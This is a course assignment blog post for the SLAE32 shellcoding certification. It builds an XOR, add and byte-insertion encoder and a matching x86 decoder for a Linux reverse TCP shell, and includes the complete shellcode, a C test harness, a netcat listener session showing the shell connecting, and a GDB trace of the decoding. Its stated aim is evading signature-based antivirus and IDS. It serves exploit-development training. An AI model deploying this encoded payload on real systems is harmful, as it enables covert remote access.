---
layout: post
title: SLAE32 Assignment4
---
![Alt](https://bohansec.com/assets/SHELLCODING32.png "Pentester Academy")

This blog post has been created for completing the requirments of the SecurityTube (Pentester Academy) x86 Assembly Language and Shellcoding on Linux certification:

[x86 Assembly Language and Shellcoding on Linux](https://www.pentesteracademy.com/course?id=3){:target="_blank"}

Student ID: SLAE-1562

### Objects
{% highlight js %}
Create a custom encoding schema like the insertion schema we showed you

PoC with using execve-stack as the shellcode to encode with your schema and execute

{% endhighlight %}

### Prerequisite

* Install libemu
{% highlight js %}
git clone https://github.com/buffer/libemu
sudo apt-get install autoconf
sudo apt-get install libtool
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
{% endhighlight %}

* Obtain the Kali (x86) Linux 2020.3 
{% highlight js %}
https://images.kali.org/virtual-images/kali-linux-2020.3-vmware-i386.7z
{% endhighlight %}

### Purpose to create custom encoding schema

When comes to shellcode encoding, using a custom encoded shellcode would have a slightly better chance to beat signature-based anti-virus and IDS/IPS compare to generate an encoded shellcode from the famous msfvenom. In this blog, the idea for my encoding schema is to chain different encoding schema together.

### Step1 - Create the encoder in Python

The encoder takes a shellcode, XOR it with "0xBB", then add each code with 5 bytes, then in the end, the "0xcc" is added in between each code. The shellcode I used is from the reverse TCP shell I created at [here](https://bohansec.com/2020/08/30/SLAE32-Assignment2/){:target="_blank"}.

{% highlight js %}
#!/usr/bin/python

# Python Encoder 

# xor with 0XBB, add 5 byte, then insert the 0xcc next in between

shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xdb\x89\xf3\x66\xb8\x6a\x01\x57\x68\xc0\xa8\xc8\x88\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x66\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

#loop through the shellcode

for x in bytearray(shellcode) :

	y = x^0xBB #XOR the current code with 0xBB

	y = y + 0x5 # add the 5 bytes to the XORed number

	encoded += '\\x'
	encoded += '%02x' % (y & 0xff) #format the shellcode
	encoded += '\\x%02x' % 0xcc #add the 0xcc next to the current code

	encoded2 += '0x'
	encoded2 += '%02x,' %(y & 0xff)
	encoded2 += '0x%02x,' % 0xcc


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
{% endhighlight %}

![encodedShellcode](https://bohansec.com/assets/assignmet4-1.png "encodedShellcode")

### Step2 - Create the decoder in Assembly x86

{% highlight js %}
global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi ;esi points to the address at beginning of the shellcode
	sub byte [esi], 0x5 ;minus the value pointed by esi with 5 byte
	xor byte [esi], 0xBB ;xor the value points nu esi with 0xBB 
	lea edi, [esi +1] ;load the address of the next byte to edi
	xor eax, eax ;initalize eax with 0
	mov al, 1 ;initalize eax to 1
	xor ebx, ebx ; initialize ebx to 0


decode:
	mov bl, byte [esi + eax] ;move 0xcc to ebx
	xor bl, 0xcc ;ebx XOR with 0xcc, it either be 0 or non 0
	jnz short Shellcode ;if the xor does not end with 0, means reach the end, jump to execute the shell
	mov bl, byte [esi + eax + 1] ;move the value at two bytes away to the ebx
	mov byte [edi], bl;move the two bytes away value to the address where 0xcc used to be, which is where edi now points to
	sub byte [edi], 0x5 ;minus 5 bytes where edi points to
	xor byte [edi], 0xBB ; XOR the value edi points to with 0xBB
	inc edi ;point edi to the next address
	add al, 2 ;eax points to two bytes away, to another 0xcc
	jmp short decode

call_shellcode:

	call decoder
	Shellcode: db 0x8f,0xcc,0x80,0xcc,0x8f,0xcc,0x65,0xcc,0x8f,0xcc,0x77,0xcc,0x8f,0xcc,0x6e,0xcc,0x8f,0xcc,0x52,0xcc,0x8f,0xcc,0x49,0xcc,0xe2,0xcc,0x08,0xcc,0xe1,0xcc,0xbf,0xcc,0x0d,0xcc,0xbe,0xcc,0x0f,0xcc,0xbf,0xcc,0x7b,0xcc,0x40,0xcc,0x37,0xcc,0x82,0xcc,0x37,0xcc,0x7d,0xcc,0x0f,0xcc,0xbd,0xcc,0x8f,0xcc,0x80,0xcc,0x10,0xcc,0x89,0xcc,0x7b,0xcc,0x40,0xcc,0xf7,0xcc,0xc7,0xcc,0x51,0xcc,0x8f,0xcc,0x65,0xcc,0x37,0xcc,0x4d,0xcc,0xe2,0xcc,0x08,0xcc,0xd6,0xcc,0xbf,0xcc,0xf1,0xcc,0xd8,0xcc,0x80,0xcc,0x18,0xcc,0x78,0xcc,0x38,0xcc,0xe2,0xcc,0xd8,0xcc,0xaf,0xcc,0xec,0xcc,0xe2,0xcc,0xd6,0xcc,0xbe,0xcc,0x37,0xcc,0x5f,0xcc,0x0e,0xcc,0xe2,0xcc,0x7b,0xcc,0x40,0xcc,0x8f,0xcc,0x80,0xcc,0xf0,0xcc,0xd8,0xcc,0x99,0xcc,0x99,0xcc,0xcd,0xcc,0xd8,0xcc,0xd8,0xcc,0x99,0xcc,0xde,0xcc,0xd7,0xcc,0xda,0xcc,0x37,0xcc,0x5d,0xcc,0xf0,0xcc,0x37,0xcc,0x5e,0xcc,0xed,0xcc,0x37,0xcc,0x5f,0xcc,0x10,0xcc,0xb5,0xcc,0x7b,0xcc,0x40,0xcc,0xdd,0xdd
{% endhighlight %}

Note: The "0xdd"s I added at the end of the shellcode are used for telling if the shellcode is reaching to the end.

### Step3 - Compile the decoder and extract the shellcode

Compile.sh:
{% highlight js %}
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'
{% endhighlight %}

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment4$ ./compile.sh decoder
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
kali@kali:~/Desktop/SLAE-Assignments/assignment4$ objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x29\x5e\x80\x2e\x05\x80\x36\xbb\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xcc\x75\x16\x8a\x5c\x06\x01\x88\x1f\x80\x2f\x05\x80\x37\xbb\x47\x04\x02\xeb\xe7\xe8\xd2\xff\xff\xff\x8f\xcc\x80\xcc\x8f\xcc\x65\xcc\x8f\xcc\x77\xcc\x8f\xcc\x6e\xcc\x8f\xcc\x52\xcc\x8f\xcc\x49\xcc\xe2\xcc\x08\xcc\xe1\xcc\xbf\xcc\x0d\xcc\xbe\xcc\x0f\xcc\xbf\xcc\x7b\xcc\x40\xcc\x37\xcc\x82\xcc\x37\xcc\x7d\xcc\x0f\xcc\xbd\xcc\x8f\xcc\x80\xcc\x10\xcc\x89\xcc\x7b\xcc\x40\xcc\xf7\xcc\xc7\xcc\x51\xcc\x8f\xcc\x65\xcc\x37\xcc\x4d\xcc\xe2\xcc\x08\xcc\xd6\xcc\xbf\xcc\xf1\xcc\xd8\xcc\x80\xcc\x18\xcc\x78\xcc\x38\xcc\xe2\xcc\xd8\xcc\xaf\xcc\xec\xcc\xe2\xcc\xd6\xcc\xbe\xcc\x37\xcc\x5f\xcc\x0e\xcc\xe2\xcc\x7b\xcc\x40\xcc\x8f\xcc\x80\xcc\xf0\xcc\xd8\xcc\x99\xcc\x99\xcc\xcd\xcc\xd8\xcc\xd8\xcc\x99\xcc\xde\xcc\xd7\xcc\xda\xcc\x37\xcc\x5d\xcc\xf0\xcc\x37\xcc\x5e\xcc\xed\xcc\x37\xcc\x5f\xcc\x10\xcc\xb5\xcc\x7b\xcc\x40\xcc\xdd\xdd"

{% endhighlight %}

![compile](https://bohansec.com/assets/assignmet4-2.png "compile")

The shellcode doesn't contain "\x00" or other undesired bad characters, so we can proceed to test the shellcode in a C program. A test program written in C is being used to test the shellcode:

{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x29\x5e\x80\x2e\x05\x80\x36\xbb\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xcc\x75\x16\x8a\x5c\x06\x01\x88\x1f\x80\x2f\x05\x80\x37\xbb\x47\x04\x02\xeb\xe7\xe8\xd2\xff\xff\xff\x8f\xcc\x80\xcc\x8f\xcc\x65\xcc\x8f\xcc\x77\xcc\x8f\xcc\x6e\xcc\x8f\xcc\x52\xcc\x8f\xcc\x49\xcc\xe2\xcc\x08\xcc\xe1\xcc\xbf\xcc\x0d\xcc\xbe\xcc\x0f\xcc\xbf\xcc\x7b\xcc\x40\xcc\x37\xcc\x82\xcc\x37\xcc\x7d\xcc\x0f\xcc\xbd\xcc\x8f\xcc\x80\xcc\x10\xcc\x89\xcc\x7b\xcc\x40\xcc\xf7\xcc\xc7\xcc\x51\xcc\x8f\xcc\x65\xcc\x37\xcc\x4d\xcc\xe2\xcc\x08\xcc\xd6\xcc\xbf\xcc\xf1\xcc\xd8\xcc\x80\xcc\x18\xcc\x78\xcc\x38\xcc\xe2\xcc\xd8\xcc\xaf\xcc\xec\xcc\xe2\xcc\xd6\xcc\xbe\xcc\x37\xcc\x5f\xcc\x0e\xcc\xe2\xcc\x7b\xcc\x40\xcc\x8f\xcc\x80\xcc\xf0\xcc\xd8\xcc\x99\xcc\x99\xcc\xcd\xcc\xd8\xcc\xd8\xcc\x99\xcc\xde\xcc\xd7\xcc\xda\xcc\x37\xcc\x5d\xcc\xf0\xcc\x37\xcc\x5e\xcc\xed\xcc\x37\xcc\x5f\xcc\x10\xcc\xb5\xcc\x7b\xcc\x40\xcc\xdd\xdd";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

{% endhighlight %}

### Step4 - Compile the shellcode in the test program and test it

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment4$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
kali@kali:~/Desktop/SLAE-Assignments/assignment4$ ./shellcode 
Shellcode Length:  228
{% endhighlight %}

{% highlight js %}
kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.200.136] from (UNKNOWN) [192.168.200.136] 48498
ls
Insertion-Encoder.py
Screenshot 2020-09-06 00:05:44.png
compile.sh
decoder
decoder.nasm
decoder.o
encoder.py
shellcode
shellcode.c
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),131(scanner)
date
Sun Sep  6 00:53:11 EDT 2020
{% endhighlight %}

![test](https://bohansec.com/assets/assignmet4-3.png "test")
![test](https://bohansec.com/assets/assignmet4-4.png "test")

The shellcode is successfully executed and the reverse TCP shell is connected to my kali's IP 192.168.200.136 on port 4444.

### Step5 - Verify the decoding process in GDB

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment4$ gdb -q ./shellcode
Reading symbols from ./shellcode...
(No debugging symbols found in ./shellcode)
(gdb) break *&code
Breakpoint 1 at 0x4040
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /home/kali/Desktop/SLAE-Assignments/assignment4/shellcode 
Shellcode Length:  228

Breakpoint 1, 0x00404040 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x00404040 <+0>:     jmp    0x40406b <code+43>
   0x00404042 <+2>:     pop    esi
   0x00404043 <+3>:     sub    BYTE PTR [esi],0x5
   0x00404046 <+6>:     xor    BYTE PTR [esi],0xbb
   0x00404049 <+9>:     lea    edi,[esi+0x1]
   0x0040404c <+12>:    xor    eax,eax
   0x0040404e <+14>:    mov    al,0x1
   0x00404050 <+16>:    xor    ebx,ebx
   0x00404052 <+18>:    mov    bl,BYTE PTR [esi+eax*1]
   0x00404055 <+21>:    xor    bl,0xcc
   0x00404058 <+24>:    jne    0x404070 <code+48>
   0x0040405a <+26>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0040405e <+30>:    mov    BYTE PTR [edi],bl
   0x00404060 <+32>:    sub    BYTE PTR [edi],0x5
   0x00404063 <+35>:    xor    BYTE PTR [edi],0xbb
   0x00404066 <+38>:    inc    edi
   0x00404067 <+39>:    add    al,0x2
   0x00404069 <+41>:    jmp    0x404052 <code+18>
   0x0040406b <+43>:    call   0x404042 <code+2>
   0x00404070 <+48>:    (bad)  
   0x00404071 <+49>:    int3   
   0x00404072 <+50>:    or     ah,0x8f
   0x00404075 <+53>:    int3   
   0x00404076 <+54>:    gs int3 
   0x00404078 <+56>:    (bad)  
   0x00404079 <+57>:    int3   
   0x0040407a <+58>:    ja     0x404048 <code+8>
   0x0040407c <+60>:    (bad)  
   0x0040407d <+61>:    int3   
   0x0040407e <+62>:    outs   dx,BYTE PTR ds:[esi]
   0x0040407f <+63>:    int3   
   0x00404080 <+64>:    (bad)  
   0x00404081 <+65>:    int3   
   0x00404082 <+66>:    push   edx
--Type <RET> for more, q to quit, c to continue without paging--
   0x00404083 <+67>:    int3   
   0x00404084 <+68>:    (bad)  
   0x00404085 <+69>:    int3   
   0x00404086 <+70>:    dec    ecx
   0x00404087 <+71>:    int3   
   0x00404088 <+72>:    loop   0x404056 <code+22>
   0x0040408a <+74>:    or     ah,cl
   0x0040408c <+76>:    loope  0x40405a <code+26>
   0x0040408e <+78>:    mov    edi,0xbecc0dcc
   0x00404093 <+83>:    int3   
   0x00404094 <+84>:    bswap  esp
   0x00404096 <+86>:    mov    edi,0x40cc7bcc
   0x0040409b <+91>:    int3   
   0x0040409c <+92>:    aaa    
   0x0040409d <+93>:    int3   
   0x0040409e <+94>:    or     ah,0x37
   0x004040a1 <+97>:    int3   
   0x004040a2 <+98>:    jge    0x404070 <code+48>
   0x004040a4 <+100>:   bswap  esp
   0x004040a6 <+102>:   mov    ebp,0x80cc8fcc
   0x004040ab <+107>:   int3   
   0x004040ac <+108>:   adc    ah,cl
   0x004040ae <+110>:   mov    esp,ecx
   0x004040b0 <+112>:   jnp    0x40407e <code+62>
   0x004040b2 <+114>:   inc    eax
   0x004040b3 <+115>:   int3   
   0x004040b4 <+116>:   test   esp,0xcc51ccc7
   0x004040ba <+122>:   (bad)  
   0x004040bb <+123>:   int3   
   0x004040bc <+124>:   gs int3 
   0x004040be <+126>:   aaa    
   0x004040bf <+127>:   int3   
   0x004040c0 <+128>:   dec    ebp
   0x004040c1 <+129>:   int3   
   0x004040c2 <+130>:   loop   0x404090 <code+80>
--Type <RET> for more, q to quit, c to continue without paging--
   0x004040c4 <+132>:   or     ah,cl
   0x004040c6 <+134>:   (bad)  
   0x004040c7 <+135>:   int3   
   0x004040c8 <+136>:   mov    edi,0xd8ccf1cc
   0x004040cd <+141>:   int3   
   0x004040ce <+142>:   or     ah,0x18
   0x004040d1 <+145>:   int3   
   0x004040d2 <+146>:   js     0x4040a0 <code+96>
   0x004040d4 <+148>:   cmp    ah,cl
   0x004040d6 <+150>:   loop   0x4040a4 <code+100>
   0x004040d8 <+152>:   fmul   st,st(4)
   0x004040da <+154>:   scas   eax,DWORD PTR es:[edi]
   0x004040db <+155>:   int3   
   0x004040dc <+156>:   in     al,dx
   0x004040dd <+157>:   int3   
   0x004040de <+158>:   loop   0x4040ac <code+108>
   0x004040e0 <+160>:   (bad)  
   0x004040e1 <+161>:   int3   
   0x004040e2 <+162>:   mov    esi,0x5fcc37cc
   0x004040e7 <+167>:   int3   
   0x004040e8 <+168>:   push   cs
   0x004040e9 <+169>:   int3   
   0x004040ea <+170>:   loop   0x4040b8 <code+120>
   0x004040ec <+172>:   jnp    0x4040ba <code+122>
   0x004040ee <+174>:   inc    eax
   0x004040ef <+175>:   int3   
   0x004040f0 <+176>:   (bad)  
   0x004040f1 <+177>:   int3   
   0x004040f2 <+178>:   or     ah,0xf0
   0x004040f5 <+181>:   int3   
   0x004040f6 <+182>:   fmul   st,st(4)
   0x004040f8 <+184>:   cdq    
   0x004040f9 <+185>:   int3   
   0x004040fa <+186>:   cdq    
   0x004040fb <+187>:   int3   
--Type <RET> for more, q to quit, c to continue without paging--
   0x004040fc <+188>:   int    0xcc
   0x004040fe <+190>:   fmul   st,st(4)
   0x00404100 <+192>:   fmul   st,st(4)
   0x00404102 <+194>:   cdq    
   0x00404103 <+195>:   int3   
   0x00404104 <+196>:   fmulp  st(4),st
   0x00404106 <+198>:   xlat   BYTE PTR ds:[ebx]
   0x00404107 <+199>:   int3   
   0x00404108 <+200>:   fcmove st,st(4)
   0x0040410a <+202>:   aaa    
   0x0040410b <+203>:   int3   
   0x0040410c <+204>:   pop    ebp
   0x0040410d <+205>:   int3   
   0x0040410e <+206>:   lock int3 
   0x00404110 <+208>:   aaa    
   0x00404111 <+209>:   int3   
   0x00404112 <+210>:   pop    esi
   0x00404113 <+211>:   int3   
   0x00404114 <+212>:   in     eax,dx
   0x00404115 <+213>:   int3   
   0x00404116 <+214>:   aaa    
   0x00404117 <+215>:   int3   
   0x00404118 <+216>:   pop    edi
   0x00404119 <+217>:   int3   
   0x0040411a <+218>:   adc    ah,cl
   0x0040411c <+220>:   mov    ch,0xcc
   0x0040411e <+222>:   jnp    0x4040ec <code+172>
   0x00404120 <+224>:   inc    eax
   0x00404121 <+225>:   int3   
   0x00404122 <+226>:   fstp   st(5)
   0x00404124 <+228>:   add    BYTE PTR [eax],al
End of assembler dump.

(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble 
>x/224xb 0x00404070
>end 

(gdb) break *0x00404066

(gdb) c
Dump of assembler code for function code:
   0x00404040 <+0>:     jmp    0x40406b <code+43>
   0x00404042 <+2>:     pop    esi
   0x00404043 <+3>:     sub    BYTE PTR [esi],0x5
   0x00404046 <+6>:     xor    BYTE PTR [esi],0xbb
   0x00404049 <+9>:     lea    edi,[esi+0x1]
   0x0040404c <+12>:    xor    eax,eax
   0x0040404e <+14>:    mov    al,0x1
   0x00404050 <+16>:    xor    ebx,ebx
   0x00404052 <+18>:    mov    bl,BYTE PTR [esi+eax*1]
   0x00404055 <+21>:    xor    bl,0xcc
   0x00404058 <+24>:    jne    0x404070 <code+48>
   0x0040405a <+26>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0040405e <+30>:    mov    BYTE PTR [edi],bl
   0x00404060 <+32>:    sub    BYTE PTR [edi],0x5
   0x00404063 <+35>:    xor    BYTE PTR [edi],0xbb
=> 0x00404066 <+38>:    inc    edi
   0x00404067 <+39>:    add    al,0x2
   0x00404069 <+41>:    jmp    0x404052 <code+18>
   0x0040406b <+43>:    call   0x404042 <code+2>
   0x00404070 <+48>:    xor    eax,eax
   0x00404072 <+50>:    xor    esp,ecx
   0x00404074 <+52>:    (bad)  
   0x00404075 <+53>:    int3   
   0x00404076 <+54>:    gs int3 
   0x00404078 <+56>:    (bad)  
   0x00404079 <+57>:    int3   
   0x0040407a <+58>:    ja     0x404048 <code+8>
   0x0040407c <+60>:    (bad)  
   0x0040407d <+61>:    int3   
   0x0040407e <+62>:    outs   dx,BYTE PTR ds:[esi]
   0x0040407f <+63>:    int3   
   0x00404080 <+64>:    (bad)  
   0x00404081 <+65>:    int3   
   0x00404082 <+66>:    push   edx
--Type <RET> for more, q to quit, c to continue without paging--
   0x00404083 <+67>:    int3   
   0x00404084 <+68>:    (bad)  
   0x00404085 <+69>:    int3   
   0x00404086 <+70>:    dec    ecx
   0x00404087 <+71>:    int3   
   0x00404088 <+72>:    loop   0x404056 <code+22>
   0x0040408a <+74>:    or     ah,cl
   0x0040408c <+76>:    loope  0x40405a <code+26>
   0x0040408e <+78>:    mov    edi,0xbecc0dcc
   0x00404093 <+83>:    int3   
   0x00404094 <+84>:    bswap  esp
   0x00404096 <+86>:    mov    edi,0x40cc7bcc
   0x0040409b <+91>:    int3   
   0x0040409c <+92>:    aaa    
   0x0040409d <+93>:    int3   
   0x0040409e <+94>:    or     ah,0x37
   0x004040a1 <+97>:    int3   
   0x004040a2 <+98>:    jge    0x404070 <code+48>
   0x004040a4 <+100>:   bswap  esp
   0x004040a6 <+102>:   mov    ebp,0x80cc8fcc
   0x004040ab <+107>:   int3   
   0x004040ac <+108>:   adc    ah,cl
   0x004040ae <+110>:   mov    esp,ecx
   0x004040b0 <+112>:   jnp    0x40407e <code+62>
   0x004040b2 <+114>:   inc    eax
   0x004040b3 <+115>:   int3   
   0x004040b4 <+116>:   test   esp,0xcc51ccc7
   0x004040ba <+122>:   (bad)  
   0x004040bb <+123>:   int3   
   0x004040bc <+124>:   gs int3 
   0x004040be <+126>:   aaa    
   0x004040bf <+127>:   int3   
   0x004040c0 <+128>:   dec    ebp
   0x004040c1 <+129>:   int3   
   0x004040c2 <+130>:   loop   0x404090 <code+80>
--Type <RET> for more, q to quit, c to continue without paging--
   0x004040c4 <+132>:   or     ah,cl
   0x004040c6 <+134>:   (bad)  
   0x004040c7 <+135>:   int3   
   0x004040c8 <+136>:   mov    edi,0xd8ccf1cc
   0x004040cd <+141>:   int3   
   0x004040ce <+142>:   or     ah,0x18
   0x004040d1 <+145>:   int3   
   0x004040d2 <+146>:   js     0x4040a0 <code+96>
   0x004040d4 <+148>:   cmp    ah,cl
   0x004040d6 <+150>:   loop   0x4040a4 <code+100>
   0x004040d8 <+152>:   fmul   st,st(4)
   0x004040da <+154>:   scas   eax,DWORD PTR es:[edi]
   0x004040db <+155>:   int3   
   0x004040dc <+156>:   in     al,dx
   0x004040dd <+157>:   int3   
   0x004040de <+158>:   loop   0x4040ac <code+108>
   0x004040e0 <+160>:   (bad)  
   0x004040e1 <+161>:   int3   
   0x004040e2 <+162>:   mov    esi,0x5fcc37cc
   0x004040e7 <+167>:   int3   
   0x004040e8 <+168>:   push   cs
   0x004040e9 <+169>:   int3   
   0x004040ea <+170>:   loop   0x4040b8 <code+120>
   0x004040ec <+172>:   jnp    0x4040ba <code+122>
   0x004040ee <+174>:   inc    eax
   0x004040ef <+175>:   int3   
   0x004040f0 <+176>:   (bad)  
   0x004040f1 <+177>:   int3   
   0x004040f2 <+178>:   or     ah,0xf0
   0x004040f5 <+181>:   int3   
   0x004040f6 <+182>:   fmul   st,st(4)
   0x004040f8 <+184>:   cdq    
   0x004040f9 <+185>:   int3   
   0x004040fa <+186>:   cdq    
   0x004040fb <+187>:   int3   
--Type <RET> for more, q to quit, c to continue without paging--
   0x004040fc <+188>:   int    0xcc
   0x004040fe <+190>:   fmul   st,st(4)
   0x00404100 <+192>:   fmul   st,st(4)
   0x00404102 <+194>:   cdq    
   0x00404103 <+195>:   int3   
   0x00404104 <+196>:   fmulp  st(4),st
   0x00404106 <+198>:   xlat   BYTE PTR ds:[ebx]
   0x00404107 <+199>:   int3   
   0x00404108 <+200>:   fcmove st,st(4)
   0x0040410a <+202>:   aaa    
   0x0040410b <+203>:   int3   
   0x0040410c <+204>:   pop    ebp
   0x0040410d <+205>:   int3   
   0x0040410e <+206>:   lock int3 
   0x00404110 <+208>:   aaa    
   0x00404111 <+209>:   int3   
   0x00404112 <+210>:   pop    esi
   0x00404113 <+211>:   int3   
   0x00404114 <+212>:   in     eax,dx
   0x00404115 <+213>:   int3   
   0x00404116 <+214>:   aaa    
   0x00404117 <+215>:   int3   
   0x00404118 <+216>:   pop    edi
   0x00404119 <+217>:   int3   
   0x0040411a <+218>:   adc    ah,cl
   0x0040411c <+220>:   mov    ch,0xcc
   0x0040411e <+222>:   jnp    0x4040ec <code+172>
   0x00404120 <+224>:   inc    eax
   0x00404121 <+225>:   int3   
   0x00404122 <+226>:   fstp   st(5)
   0x00404124 <+228>:   add    BYTE PTR [eax],al
End of assembler dump.
0x404070 <code+48>:     0x31    0xc0    0x31    0xcc    0x8f    0xcc    0x65    0xcc
0x404078 <code+56>:     0x8f    0xcc    0x77    0xcc    0x8f    0xcc    0x6e    0xcc
--Type <RET> for more, q to quit, c to continue without paging--
0x404080 <code+64>:     0x8f    0xcc    0x52    0xcc    0x8f    0xcc    0x49    0xcc
0x404088 <code+72>:     0xe2    0xcc    0x08    0xcc    0xe1    0xcc    0xbf    0xcc
0x404090 <code+80>:     0x0d    0xcc    0xbe    0xcc    0x0f    0xcc    0xbf    0xcc
0x404098 <code+88>:     0x7b    0xcc    0x40    0xcc    0x37    0xcc    0x82    0xcc
0x4040a0 <code+96>:     0x37    0xcc    0x7d    0xcc    0x0f    0xcc    0xbd    0xcc
0x4040a8 <code+104>:    0x8f    0xcc    0x80    0xcc    0x10    0xcc    0x89    0xcc
0x4040b0 <code+112>:    0x7b    0xcc    0x40    0xcc    0xf7    0xcc    0xc7    0xcc
0x4040b8 <code+120>:    0x51    0xcc    0x8f    0xcc    0x65    0xcc    0x37    0xcc
0x4040c0 <code+128>:    0x4d    0xcc    0xe2    0xcc    0x08    0xcc    0xd6    0xcc
0x4040c8 <code+136>:    0xbf    0xcc    0xf1    0xcc    0xd8    0xcc    0x80    0xcc
0x4040d0 <code+144>:    0x18    0xcc    0x78    0xcc    0x38    0xcc    0xe2    0xcc
0x4040d8 <code+152>:    0xd8    0xcc    0xaf    0xcc    0xec    0xcc    0xe2    0xcc
0x4040e0 <code+160>:    0xd6    0xcc    0xbe    0xcc    0x37    0xcc    0x5f    0xcc
0x4040e8 <code+168>:    0x0e    0xcc    0xe2    0xcc    0x7b    0xcc    0x40    0xcc
0x4040f0 <code+176>:    0x8f    0xcc    0x80    0xcc    0xf0    0xcc    0xd8    0xcc
0x4040f8 <code+184>:    0x99    0xcc    0x99    0xcc    0xcd    0xcc    0xd8    0xcc
0x404100 <code+192>:    0xd8    0xcc    0x99    0xcc    0xde    0xcc    0xd7    0xcc
0x404108 <code+200>:    0xda    0xcc    0x37    0xcc    0x5d    0xcc    0xf0    0xcc
0x404110 <code+208>:    0x37    0xcc    0x5e    0xcc    0xed    0xcc    0x37    0xcc
0x404118 <code+216>:    0x5f    0xcc    0x10    0xcc    0xb5    0xcc    0x7b    0xcc
0x404120 <code+224>:    0x40    0xcc    0xdd    0xdd    0x00    0x00    0x00    0x00
0x404128:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404130:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404138:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404140:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404148:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

Breakpoint 2, 0x00404066 in code ()

(gdb) x/5i 0x404070
   0x404070 <code+48>:  xor    eax,eax
   0x404072 <code+50>:  xor    ebx,ebx
   0x404074 <code+52>:  xor    esp,ecx
   0x404076 <code+54>:  gs int3 
   0x404078 <code+56>:  (bad) 
(gdb) 

{% endhighlight %}

The encoded shellcode keep being decoded, we can see our original reverse TCP shellcode is slowly presented as its original assembly code.

![gdb](https://bohansec.com/assets/assignmet4-5.png "gdb")
![gdb](https://bohansec.com/assets/assignmet4-6.png "gdb")

You can find all the above code at [here](https://github.com/allan9595/SLAE-Assignments/tree/master/assignment4){:target="_blank"}.

Thanks for reading :)